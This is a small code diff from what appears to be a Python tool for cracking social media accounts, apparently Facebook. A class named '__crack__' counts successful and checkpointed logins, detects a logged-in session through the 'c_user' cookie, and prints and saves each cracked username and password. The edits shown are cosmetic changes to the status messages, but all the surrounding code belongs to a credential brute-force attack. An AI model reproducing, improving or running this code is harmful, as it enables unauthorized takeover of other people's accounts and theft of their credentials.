@@ -465,7 +465,7 @@ class __crack__:
 
 		global ok,cp,loop
 
-		sys.stdout.write('\r\033[1;32m[ MAFIYA ❤️] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
+		sys.stdout.write('\r\033[1;32m(MAFIYA ❤️) \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
 
 		sys.stdout.flush()
 
@@ -503,7 +503,7 @@ class __crack__:
 
 			if 'c_user' in ses.cookies.get_dict():
 
-				print('\r\033[1;32m[ID-SUCCESSFUL] %s | %s      ' % (user,pw))
+				print('\r\033[1;32m(ID-SUCCESSFUL) %s | %s      ' % (user,pw))
 
 				wrt = '%s - %s' % (user,pw)
 
@@ -553,7 +553,7 @@ class __crack__:
 
 					pass
 
-				print('\r\033[1;91m[ID-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
+				print('\r\033[1;91m(ID-CHECKPOINT) %s | %s%s      ' % (user,pw,tahun(user)))
 
 				wrt = '%s - %s%s'%(user,pw,tahu(user))
 
